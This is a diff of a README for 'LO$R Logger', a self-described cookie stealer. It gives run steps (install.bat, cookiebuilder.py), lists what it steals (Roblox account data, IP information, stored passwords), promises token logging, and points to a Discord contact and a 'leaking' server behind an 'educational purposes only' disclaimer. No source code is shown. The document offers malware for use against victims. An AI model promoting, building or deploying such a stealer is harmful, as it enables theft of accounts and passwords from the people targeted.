@@ -1,19 +1,23 @@
 # LO$R Logger
 good Cookie stealer
 
-run install.bat
 
-run cookiebuilder.py  
+## STEPS
 
-# token log will come soon
+### 1. run install.bat
 
-what does LO$R Logger steal?
+### 2. run cookiebuilder.py  
 
-Roblox info 
 
-Ip Info 
+## token log will come soon
 
-Stored Passwords 
+## what does LO$R Logger steal?
+
+### Roblox info 
+
+### Ip Info 
+
+### Stored Passwords 
 
 token logging soon
 # PREVIEW
@@ -24,3 +28,6 @@ token logging soon
 ! LO$R#0001 on discord
 
 discord.gg/leaking
+
+
+# THIS IS ALL FOR EDUCATIONAL PURPOSES ONLY! I AM NOT RESPONSIBLE FOR ANY MALICIOUS USE OF THIS PROGRAM
